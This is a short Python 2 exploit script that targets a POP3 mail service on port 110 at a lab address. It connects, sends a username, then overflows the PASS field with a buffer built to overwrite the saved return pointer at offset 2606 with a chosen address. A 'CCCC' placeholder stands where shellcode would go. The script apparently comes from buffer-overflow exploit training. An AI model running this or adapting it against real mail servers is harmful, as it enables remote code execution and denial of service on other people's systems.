#!/usr/bin/env python2
import socket

RHOST = "10.0.2.15"
RPORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf_totlen = 1024
offset_srp = 2606

buf = ""
buf += "A" * (offset_srp - len(buf))
buf += "\x8f\x35\x4a\x5f"
buf += "CCCC"
buf += "D" * (buf_totlen - len(buf))
buf += "\n"

s.connect((RHOST, RPORT))
data = s.recv(1024)
print data
s.send('USER username' + '\r\n')
data = s.recv(1024)
print data
s.send('PASS ' + buf + '\r\n')
